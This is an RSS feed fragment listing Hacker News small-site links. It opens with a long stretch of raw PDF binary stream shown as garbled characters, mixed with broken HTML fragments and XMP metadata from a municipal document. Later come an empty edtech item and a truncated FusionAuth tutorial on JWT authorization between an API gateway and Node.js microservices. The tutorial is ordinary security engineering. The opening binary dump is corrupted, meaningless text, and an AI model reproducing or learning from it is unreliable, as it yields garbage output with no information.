/N,Nàðÿ¤WMsãD½çWLµªÂŠ&gt;m‰ÚÚ*’x!‡�›[NŽmŠc™~==ýzfZ’m&nbsp;¸$–4ÓÓÓï½6A°š&amp;Ô©CO@Ü~ìÉñá”C¥ÒEc(—9›*¿LÉöÃ;%rÌUà%´´}�®¤‘DôK°°çÀ
f?Ýå;÷7Üu=˜­d6ê&nbsp;Š}¨G´Ú)@Óé9Pñ6[dóŽrTÒcèÑxBÝ9¯ýr&lt;Ñ¹8&lt;0pî ›F
ÀôiYÌ´bjý¨’…(ùÚ
Ä'U-l:ŸÊBƒàüæÒœ�ß™÷ïÏo.¯¯La&gt;|¸¸¢wc,›`ó$ó÷ÿZ4öJ
€g±{Š¨-
Ãà
e²&lt;}Îõ”®­ÖK\tÏK±aÉõ*0)ºu»K~õUÜ³ü¼=ÖD­ê
Ç:DWJ]rß={”‰ûâ¶ÊW~¦êzå¢Î‹ËÚ­i°ä&nbsp;8t³Š9‡|2ŠœšY|¥_é&gt;?2µ„&lt;&nbsp;,Ÿ]s¹¶¼ouHÊÏÀ%$£!Or(YÃS^ÐJœ¹%·‘×øOÔ¼µÅŽ#âœ¾*q®öœÄu~ª€ËLyªuý^Û¢tÌ¼üIq®®kFFž×2N„íÙc¥UÆ…'ý1ÆYüoÐBR7¥È&nbsp; T©dŒ©0§{Æa€ç7h
ä1&gt;wŠ3±—ªíÂ›G­¸ì^Êw9.ô?É&nbsp;…:€è–wow^¯gái
µÆ÷ÓÊ7›‘tÔ´q÷&lt;`×ÜÆ
Aá»!,MXÈ¼gWœ÷­˜ËöjºÇ�€®¨^0{ÀJe€º¼qê²_~‰�Ì$x{ëÚÆ+;ÖuôfÑšë¸•Vqþ„D½ÛT�HšÎë©%o}&amp;l´÷
©Ürã
íeqáíÂ[®�eQÄ!ã¯°¹€ÉÝ
sÁØh*¾¼›�æ‚Dæ‚ÂcaØm&amp;µµ¯)ðo#`Šäv¥¥Ã!�†zªcú®êI·]Á,ÅÛ›Ê³O[5^uZä,*Cêi»ó®sMÂ³•žpÅ\zå-…ÆW
ÖÍ:ˆ§ETKÂß=&gt;ìw¾Sz+Óà°’=ä«zù‡ý8¢Ø6Ì�ZZ…«vák«tµÅ¤“—jØ¬PVÇ',WÉäãŠü�ØS(‚(
:üoz¤#L�Gßpf?$¼�f2b4»4koA*F�D€Q�¨n~vþcîénêèî‚Þßß§†bÕxÙ¡&amp;	ªé„Ä[Bñs–™Œú£¦`¾P«Æö²�Á‚&amp;ÜY™i7Â1žº'ž»Ó8­=ùÒ’È¢¢%±A SŒ¸”C!+û¼_-DÝCd�&gt;Sû±†&nbsp;ã5+=-HEòë·h“d)·èÈº¢³ö
&amp;ŒVU\…—rÌç¨´K	{S{š¹sS-»D&lt;@wò)íëæ{º}U¦Æ¼-7g3roJá,âÙÔ3$..¨\wOg
gdÊÌËX&nbsp;&nbsp;&amp;!¨}â°ÆyË8i	¹\Ø¤=¼ûSß³5_±.D&gt;7¸Cç3}ƒñ9Y&lt;õ’øŽ�î`ûåÈ&lt;)œ˜·@ø(œPo»hê~Ë€Ý�0æ­@DbÃŸq”™ÿþ‚ØRÂkíF€�úÔšoÝØÌ­o]Ù-d“´ªÛ	:�óš?"7C`OÛ&gt;ÙÒ©{ãÅÓ°ÿJK'¤fårx@ÃNòt@=·$Ž©¶~‰&amp;,ýqlÊWfš°¯Ç{ÊäÔ&amp;²ïO'õéÒ�ÒÐ{_Ôre/sœ��k^=g-ÚöOF»ŸCÈXønyWÖóÛõ#
IGš¶É3šÝ=h°*NNÆº&gt;kê»äÿÅºü±‰˜ìÀäàD
0wÇ€ÉìÚÂýJÀ¤°Qz§Á¢[»HÔó+ûe×—î,æ¡N˜š÷�QØœb9É×Ô|5‹"û¸CuÁ0g6kš5Ú$uìƒ�#¦"ÄX†±ó(¦n’
Ã‹=cL¼�é.—À€îÈþ!¾ó³é$€æ¾K‹&lt;äüF‰Ù‰#´—MÿíeÎùŠFW ­©½=³Òz'
‰äËÇ—ˆ´¶ôåIL%ÄÕR
9w/À=^#ß„½ºA$ëÀÁe®Þ¼Îÿ‰½Ò¼²¼¢Øë(y‘À?Å^…�M1¦¯”²1ƒæøéü{ö.&nbsp;€cúð·?oŒ�
endstream
endobj
4 0 obj
&lt;&gt;stream
H‰ÌWYoãF~×¯è§…ŒÚìæÁÚò8ãA¼ãDBöÁ›Z‡ÅŒD+•ÿû­®ê‹ÔaÏìËe6»ëê¯¾ªºš..›¶Z–³–ýøãÅeÛ–³ÕbÎ.¦Ï[öÇÅÕÕóWö�&amp;¼Hc–É”K‘²$‰yž³,Iy!$ìšìÛ—í‚]|X”óEÃ.¦øv_&gt;UuÙVÏ5ûé§«ë1\Œ'!›íXÈØnV.¦Ó�	6]B†	›ÎØHýK_H…°~3ø‹cž²éfð09&gt;’
7A¬•z´í".x°ç@H.ØpÉ‚‚ðuE_Ù¿ƒ„
W�µ”µ:»þ˜~„Ê„µƒ…úw&gt;²`úç@Ûå[(%cÚó0¼Y#ÐöŒ@Z³ÇŸ•4/=ÙOã®hé÷Ø¨Š¬ªB	y"Œ¦wèžJ/zÂ%�_³{l$¸”¸ëæò†j�0<kŒvqp·pÄ ³ŽÂ‘Õè�a÷:4#ým9s="" rj‰y–(hŒ‚„Âc"ø�w:ÊñÖ{ÊÃôŒÐ÷w�Ï÷�"•wãÛkø¬a{5upª±�sŒ²cb+þ«�="" +ÀÆð‚�©x›b^x£˜Þäi‘vkª="ˆ­—7U" °À•u \Î¸q•9Ï`uÍn)9="" ¼[½soi{‘iy–Šn,¦ ="">Àa’f &gt;ei¹³Þ õCç¬Y–7Ÿ{6aÂöíYžf€&amp;Ii&gt;U¹¹¢\F¤ãfì|¯ÿ#¥T˜Ü)ì�d‡çó
~•»-rî¯q©Þ1ÙÙŒ(”Òá–D``FUÃmIä‚’½ÏdzÄc›KTÔ&nbsp;tÔ††Uz4+Õ`V?BikqßÊíføÔt©+ÍÑ
ÑõƒmñkãLÃ�súhQë–kM}è…ÈHE¡ö‚ƒræ¸ð¢,`îÊî&nbsp;m�žá
ˆe–‡áÌ2õßA¦÷6Ö½9#;–¤ñÚPº2˜¾ÔÞºËÆàáâ.�Üƒ¤&lt;2TòlH®‡@€·Íª¥F[:çÈC
(Ù�ßöævÈBŒ2Ý.ù˜Ä�øÀóÛ–ÄðCc³~]�çÞ�q–&lt;ÉYŽMä)ÎJ�¨�~ˆVÈÈãä•Ry¹
†Ô¤x+Å\DV*}šÍvA¦jöžÞÖ-¼ÂžRý*tx›S( Ïr_…X½®zñÍ¹,^ç9ó(õyNœ$ºè,ÑÙá¹ÄÇèÉŠ
â…˜ÿgïˆ\¡Ò¨‹¦Btµ¸�žï€è» �áòBnª
r¬Â}ù	q|$Cü=PyNÆÖÉÃÔÑé‘´ÿ›Bù¾%Rc÷–1'j—`:Ü»6dÝôH¯Ob–%nœ´²'“ý#Æ#SÅ¢çgÜkSú~&amp;gýÄÓžŸ­½u­YL³š|gíWÎá´vïüŽÍæŽ×Â�àØŒ*6ºä4-ÿ¦]W:vA¢î\3ÑžÏ öyg×	t¯òIz”OF6ÃÏòI"
ì€nOv@obŽÂt´ªyŒÉ?ä…GÊÿµN|Í$�=’ç–Jž(2¥þ]Àj†�]
¾é^ªßeÀÅkŒ‘@ÙËã·1Föý­Q\„ª–o�4r¶•½ñ~t§¡û*MêOºŽ@©Vaëú:ÍV%Õ5,¿5)lIý£.”Øæ0”O|üÓËk¡ ®mAé¦Ø"Mèk›ßäÆ]¯·®©õ�¢¬¿T™/¡P&amp;½A‹¾w¯uA©½®Ng_·qB­llSŒ³mHÞAÈxd[�E€¦ï0ÀÞ„FX«ˆÅW†Ë‘ñJŠö=ŽN{e˜6#‚u5CWïô¡Âœ$YT:¨¶&lt;ù
Ÿ•å
¾G†Á
4Á‰·t©¸¶Ä'�Ù”¾èg4I¯q`l¨½bÕh‡õoCöýEXAIôeŽ/Ük+1jÞÕ|&nbsp;è�pH�§~©–UÞ±’xÑ=¿=¶Ùó0zdàmÃ0•ÍüDüL-ÆótUÕÎ}ÑB¶Ê<rÙ´˜u¸gå–Éõõ?>ºÛ£��;ÞTm§Æ«ƒ©…Ð¦Ç&nbsp;…‘ƒ÷eÎÓÌàqìÂCpk*r¸d?+[ª5éDÃtç1ÅíÞUhXô�æ³³’Šî/UýÙRbn(ñb&lt;l¶SæAUâ’i–dÄ”]~DÿFd¿‡ŒÖŸ1³Ý0…Iü?ýS³ýŠ‹Ø`O/;qUÔ­7ÖHm&lt;È4o”Î)U6'Û²¶~~áOBtMûâJ°£xÅ¼€Æ3N96†C®[þ¤W€ÎÇIUŠ8æ2f"•J 6š®ùµü;iã7Ï±Èx†õiøñd¹‡‚Yä§gÑ+€<j <="" ÷’Ç¦fã¦Ì 9£Ý²°}b="" À§–�è#Çb="" r¥l·ÄŸ®ë1Ð{šŸ«ë¿\="Ï_\4Ï�‘õíÈ<å€Èƒ'Lð¢Ãàei/vgšîš¦kÄóÆuÎ„f\Õ­äï�t­5åµß'´®o\ïZ·ÝvTqdª;UÌº¹Îž'Í·ð[�jTçuÎµWäÁ(!µ™Ö$A6u²úo•�®šS_„{Öº3ðxaîs±õ%ö@K¿Mñ#p‚=©]ˆ(ÄŸ‚¨[îÊ†ÔÝ½s5ŽvPi­¶´qM�.§fxóii¾<$þOdpì*Qñ£«Š" “*$×ß©Æˆ\¦…ŸŸù‘é="" ;˜z˜Ïü©©ñ‘jÇÏcù�ÐîÆ½ƒlÝ‘`q×õÊv$‚@¦"usù«="" ÓÀ_¤?ø1m4•jÆè&¨p£Ðß½zwª³šhiØ�ÐmÓ="" ‰¸öz…ëûÖ oÐxŸÛv="" ­Ýh°Ì(iˆu‹0ûäujƒ^wfú©cÜs±="">ÆÊ÷«[ñ	‰J—Å¢í×\’8.K¤É’D–¯"ùˆ?‹Ã¯l”Ñ;tƒ�fÓP&nbsp;!}pf<l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mŠh2Ú¯‰l 81="" ½èibÓéÀ”u¶lóµ-5ów="?¤býs~ß�n€iÊ�«™<ìàN6o]ý" ”Äsêåõê¬w·gza7="" ¸v°«?æi|Ö€èŒxØób}xék¯“ØŸ*Ó¼ÛnÂhz="">"ñÙˆ¤²;CöÒ°¡ú†¡YÞ/Ì€Å.©Pá²1
(zš*='*Ï;*
K‚¥ÍoMg˜e=–�¡¯9ëprÆa:
}™¹‚
?¶1üÛxDÂªÚÙ¥wR(Ì0©K¦¡`3Çáb¨µ'¯DfÒ²½ñNO!­¡LÿúÞ'&lt;ŽÎzŸžóO{÷ý¦üöé©gs¨ôÖe¦’ÿÃPEòÿO‡*ù�S•i2yóUjlòF¨~ïï0…^°;½Öõç�¨éOD�ÓžKF4ýJà¹AlRô	žd9NåX•&gt;]›"ª­°€ø«®Ë˜¶¸R#4wúªVëÓ�ìÁUFò¤ÁÊêznª§}³p!��'*Ä“ñ¿@_Â¾°œÝ±Á_L9¦ºÆîN%«L�=a³Í@}ØD]¢n`=˜~Õ™Ó×ekž“w%
ðHäÅ+Òþ+Àš—¸
endstream
endobj
9 0 obj
&lt;&gt;stream
<!--?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?-->
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c015 84.159810, 2016/09/10-02:41:30        ">
   <rdf:rdf xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpmm="http://ns.adobe.com/xap/1.0/mm/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:pdf="http://ns.adobe.com/pdf/1.3/" xmlns:pdfx="http://ns.adobe.com/pdfx/1.3/">
         <xmp:modifydate>2019-01-18T13:13:43-05:00</xmp:modifydate>
         <xmp:createdate>2019-01-18T13:11:18-05:00</xmp:createdate>
         <xmp:metadatadate>2019-01-18T13:13:43-05:00</xmp:metadatadate>
         <xmp:creatortool>Acrobat PDFMaker 15 for Word</xmp:creatortool>
         <xmpmm:documentid>uuid:94187431-f8c4-40b7-bdb3-fa92848afafd</xmpmm:documentid>
         <xmpmm:instanceid>uuid:96c8373f-a802-…</xmpmm:instanceid></rdf:description></rdf:rdf></x:xmpmeta></l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mšh2ú¯‰l></j></rù´˜u¸gå–éõõ?></kœvqp·pä></p></qœzq|žañ<±q"æòám�7ž¤z‹a,j�†ú‘¢³$fàgóšqða—p€ëdæä¾yq¼q3�´~ayhåcò“íhø°ç½†@r€0³(câµû†kÿsàj£á`û#›²úì8äqe3‚_�ïû,ab‚'ìp‡§0®0 (></q.¼ñˆt0ü‰µ#®@n“ ‹�{nhs()></vˆñä"céhà)þ\g*‡î„ë~ãp7‚¬÷></l¶šµò­·¯uá*~ˆóx!"ö></ejò‚èôùæ�ìc÷§q></sœx‚zc)v:&è\´;{âdéç)jq(f"¯”èƒã³†ä1¤ˆïyôç°òˆ8l9ù&»�_ÿœããâ²^žòþåñçeœôcnø£¤˜†w%nõiºd\ÿ�ç;¬€o6:ê]-></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</a></em></p>]]>
            </description>
            <link>https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077762</guid>
            <pubDate>Fri, 13 Nov 2020 01:28:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealth edtech startup just raised a $4.3M seed – here's their Notion page]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077615">thread link</a>) | @jcs87
<br/>
November 12, 2020 | https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077615</guid>
            <pubDate>Fri, 13 Nov 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JWT Authorization in a Microservices Gateway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077446">thread link</a>) | @mooreds
<br/>
November 12, 2020 | https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>In a recent article, we set up an API gateway with microservices for an eCommerce enterprise. FusionAuth handled our centralized authentication and then we passed user details for authorization to the microservices.</p>

<!--more-->

<p>In this article, we’ll build on the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway">example project</a> from that article, focusing on tightening up security by implementing <a href="https://tools.ietf.org/html/rfc7519">JSON Web Token</a> (JWT) authorization. This is a critical security concern because we don’t want to allow just any application to call our microservices. You may want to re-read the <a href="https://fusionauth.io/blog/2020/09/15/microservices-gateway/">Centralized Authentication with a Microservices Gateway</a> post to refresh your memory. And we’ve created a new <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a> with updated source code based on this article.</p>

<p>Even though we’re allowing public access to the Product Catalog, we still want that traffic to come through our gateway application. That will ensure centralized access to our Product Catalog, and our microservices will be more protected.</p>

<p>So here’s what we’ll do:</p>

<ul>
  <li>Add the <code>jsonwebtoken</code> package to our gateway and microservices.</li>
  <li>Utilize FusionAuth’s HMAC default signing key to create <a href="https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">signed JWTs</a> for the gateway to pass to the microservices.</li>
  <li>Add roles to this JWT if the user is present.</li>
  <li>Decode that JWT in each of the microservices, using the same signing key, to verif the request.</li>
</ul>

<p>This JWT will take the place of the API key used to ensure only the gateway accesses these services. Because it is a JWT, it can contain additional information for the microservices.</p>

<h2 id="jwt-authorization">JWT Authorization</h2>

<p>JWTs are a standardized method for securely passing claims between two parties, allowing that information to be verified by the recipient. We’re going to use them for the purpose of authorization (authorizing the gateway to access the microservices) as well as passing information (user claims, such as role membership).</p>

<p>If you are going to make the code changes, clone the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">example project</a>, otherwise feel free to follow along conceptually.</p>

<p>In your gateway application, install <code>jsonwebtoken</code>:</p>



<p>Next we’ll head over to FusionAuth to get our key for signing the JWT.</p>

<h3 id="signing-the-jwt-using-fusionauths-key">Signing the JWT using FusionAuth’s key</h3>
<p>By signing JWTs using FusionAuth’s default signing key, we’re effectively limiting access to applications that have the key, thus allowing private microservices to ensure the incoming message is from a trusted caller: the gateway.</p>

<p>Because we control all the microservices, we’ll use a symmetric signing algorithm, such as HMAC. We could also use a public/private key signing algorithm, such as RSA, which would be less performant but wouldn’t require us to share a secret between the signer of the JWT and its consumers.</p>

<p>To access your FusionAuth default signing key, go to <strong>Settings &gt; Key Master</strong>, click on the magnifying glass next to the key with the name “Default signing key”, then reveal it and copy the value of the “Secret”.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/microservices-jwt-auth/signing-key-secret.png" alt="Finding the JWT signing key value."></p>

<p>Now we add this value as a variable to the gateway application (in <code>/routes/index.js</code>) and require the <code>jsonwebtoken</code> library.</p>

<p>In production applications, avoid storing secrets in code. Instead, use a separate secrets store and obtain the secret from that store at runtime. Below we illustrate how to pull this value from an environment variable, which is a good option for some deployment environments.</p>

<div><div><pre><code><span>// ...</span>
<span>const</span> <span>jwtSigningKey</span> <span>=</span> <span>'</span><span>[Default Signing Key]</span><span>'</span><span>;</span>
<span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>
<span>// ...</span>
</code></pre></div></div>

<p>Next, we’ll add a function at the end of that file to get the gateway <code>Bearer</code> token which will then be forwarded to the microservices. In this case, we are setting the token to expire in ten minutes. This is a common duration of the JWT, but you may want to reduce it for security concerns, as described in FusionAuth’s article on <a href="https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/">Revoking JWTs &amp; JWT Expiration</a>.</p>

<div><div><pre><code><span>// ...</span>
<span>function</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>)</span> <span>{</span>
  <span>// Recall that we put the User in the session in the previous post, but they might not be logged in so protect this code</span>
  <span>// from a null User. </span>
  <span>var</span> <span>user</span> <span>=</span> <span>req</span><span>.</span><span>session</span><span>.</span><span>user</span><span>;</span>
  <span>var</span> <span>token</span> <span>=</span> <span>jwt</span><span>.</span><span>sign</span><span>({</span> <span>data</span><span>:</span> <span>req</span><span>.</span><span>url</span><span>,</span> <span>roles</span><span>:</span> <span>user</span> <span>!==</span> <span>null</span> <span>?</span> <span>user</span><span>.</span><span>registrations</span><span>[</span><span>0</span><span>].</span><span>roles</span> <span>:</span> <span>null</span> <span>},</span> <span>jwtSigningKey</span><span>,</span> <span>{</span> <span>expiresIn</span><span>:</span> <span>'</span><span>10m</span><span>'</span><span>,</span> <span>subject</span><span>:</span> <span>'</span><span>gateway</span><span>'</span><span>,</span> <span>issuer</span><span>:</span> <span>req</span><span>.</span><span>get</span><span>(</span><span>'</span><span>host</span><span>'</span><span>)</span> <span>});</span>
  <span>return</span> <span>'</span><span>Bearer </span><span>'</span> <span>+</span> <span>token</span><span>;</span>
<span>}</span>
<span>// ...</span>
</code></pre></div></div>

<p><code>getGatewayBearerToken()</code> creates a bearer token valid for ten minutes and utilizes our public signing key. It’s how we will provide secure, general access between the gateway and any microservices which don’t require any further authorization. All this JWT is guaranteeing is that the request for the API came through the gateway.</p>

<h2 id="gateway-router-integration">Gateway Router Integration</h2>
<p>For the Product Catalog routes, we’ll use <code>getGatewayBearerToken()</code> to prepare the <code>Bearer</code> token and attach it to the <code>authorization</code> header.</p>

<div><div><pre><code><span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/products</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`</span><span>${</span><span>productUrl</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Let’s update one other route in the API Gateway. This is the protected route that requires the user to be logged in and authenticated. We will pass a <code>Bearer</code> token that contains roles down to the microservices:</p>

<div><div><pre><code><span>// ...</span>
<span>/* PRODUCT INVENTORY ROUTES */</span>
<span>// The checkAuthentication function was defined in our last post and it ensures that the user is logged in or redirects</span>
<span>// them to FusionAuth to login.</span>
<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/branches/:id/products</span><span>'</span><span>,</span> <span>checkAuthentication</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`http://localhost:3002/branches/</span><span>${</span><span>req</span><span>.</span><span>params</span><span>.</span><span>id</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
<span>// ...</span>
</code></pre></div></div>

<p>You can see that this code is nearly identical to the code for <code>/products</code> above. Since both APIs in the Gateway create a JWT and pass it down to the Microservices, they use the same method to authenticate and authorize API calls. Having everything be the same in the API Gateway is definitely a good thing and we could even extract the JWT creation code out to a middleware at some point.</p>

<h2 id="microservice-jwt-integration">Microservice JWT Integration</h2>

<p>We’re now ready for the microservices to handle the <code>Bearer</code> token passed in the header. As each microservice will need to handle the tokens in the same way, it makes sense to create a package utility that can be shared by each microservice. For example, here’s the flow of a request to the Product Catalog:</p>

<figure>
        <img src="https://fusionauth.io/assets/img/diagrams/blogs/jwt-authorization-microservices/catalog-flow.svg" alt="Retrieving the Product Catalog.">
        <figcaption>Retrieving the Product Catalog.</figcaption>
      </figure>

<h3 id="authorization-middleware">Authorization Middleware</h3>

<p>Here we’ll just cover the contents of the utility, as the <a href="https://docs.npmjs.com/creating-node-js-modules">package creation</a> is a little out of scope for this article. For convenience, we’ve included this in a <code>shared</code> folder in the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a>.</p>

<div><div><pre><code><span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>function</span><span>(</span><span>options</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> <span>authorization</span> <span>=</span> <span>req</span><span>.</span><span>headers</span><span>.</span><span>authorization</span><span>;</span>
      <span>if</span> <span>(</span><span>!</span><span>authorization</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Authorization header missing. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>bearer</span> <span>=</span> <span>authorization</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>bearer</span> <span>||</span> <span>bearer</span><span>.</span><span>length</span> <span>!=</span> <span>2</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Bearer header value malformed. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>token</span> <span>=</span> <span>bearer</span><span>[</span><span>1</span><span>];</span>
      <span>if</span> <span>(</span><span>!</span><span>token</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Token not provided. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>decoded_token</span> <span>=</span> <span>jwt</span><span>.</span><span>verify</span><span>(</span><span>token</span><span>,</span> <span>options</span><span>.</span><span>jwtSigningKey</span><span>);</span>
      <span>req</span><span>.</span><span>roles</span> <span>=</span> <span>decoded_token</span><span>.</span><span>roles</span><span>;</span> <span>// These could be null if the user isn't logged in</span>

    <span>}</span> <span>catch</span><span>(</span><span>err</span><span>)</span> <span>{</span>
      <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>);</span>
      <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
      <span>return</span><span>;</span>
    <span>}</span>

    <span>next</span><span>();</span>
  <span>}</span>
<span>};</span>

<span>function</span> <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span> <span>{</span>
    <span>res</span><span>.</span><span>redirect</span><span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span>
  <span>}</span>
  <span>else</span> <span>{</span>
    <span>res</span><span>.</span><span>status</span><span>(</span><span>401</span><span>).</span><span>json</span><span>({</span>
      <span>status</span><span>:</span> <span>401</span><span>,</span>
      <span>message</span><span>:</span> <span>'</span><span>UNAUTHORIZED</span><span>'</span>
    <span>})</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>We’re exporting a function that looks for the <code>Authorization</code> header key coming from the gateway. It goes through the following steps:</p>

<ol>
  <li>Find the <code>authorization</code> header</li>
  <li>Split the value it finds (giving us <code>Bearer</code> and the token)</li>
  <li>Grab the token portion</li>
  <li>Verify and decode the token using the <code>jwtSigningKey</code></li>
</ol>

<p>If all those steps are successful, we’ll end up with a decoded token. And if there were roles included, they will be added to <code>req</code>. For any errors in the process, the <code>handleUnauthorized</code> function will redirect to the login page and/or respond with a <code>401: UNAUTHORIZED</code>.</p>

<p>Why do we care about roles? For correct authorization in the Product Inventory service, we want to ensure a request is made with the correct role. We’ll explore that after we examine the Product Catalog integration.</p>

<h3 id="product-catalog-integration">Product Catalog Integration</h3>
<p>We have our <code>authorizationMiddleware</code> in place, and it’s pretty simple to integrate it into the Product Catalog microservice (in <code>app.js</code>):</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>LOGIN_REDIRECT_URL</span> <span>}</span> <span>=</span> <span>process</span><span>.</span><span>env</span><span>;</span>
<span>var</span> <span>authorizationMiddleware</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>authorization-middleware</span><span>'</span><span>);</span> <span>// assuming it's packaged under that name</span>

<span>// ...</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>authorizationMiddleware</span><span>({</span> <span>jwtSigningKey</span><span>:</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>loginRedirectUrl</span><span>:</span> <span>LOGIN_REDIRECT_URL</span> <span>}));</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>'</span><span>/</span><span>'</span><span>,</span> <span>indexRouter</span><span>);</span>
<span>//...</span>
</code></pre></div></div>
<p>Note that we’re using the <code>authorizationMiddleware</code> prior to the <code>indexRouter</code>, which will ensure the middleware is applied to all our routes.</p>

<p>Remember that we’re using the <code>jwtSigningKey</code> to verify the JWT has been signed with the FusionAuth default signing key. Above, we manually pasted the string in, but here we’ve implemented it as an environment variable. This is better than hard-coding the key in code.</p>

<p>In your local environment, you can add your <code>JWT_SIGNING_KEY</code> to your <code>bash_profile</code> or export it to your environment:</p>
<div><div><pre><code><span>export </span><span>JWT_SIGNING_KEY</span><span>=[</span>Default Signing Key]
</code></pre></div></div>

<p>Make sure you restart your microservices after you’ve set this environment variable.</p>

<h2 id="product-inventory-integration">Product Inventory Integration</h2>
<p>The Product Inventory service endpoint, <code>/branches/:id/product</code> has role-based access. Previously we were pulling that from a FusionAuth generated JWT, but let’s pull …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077446</guid>
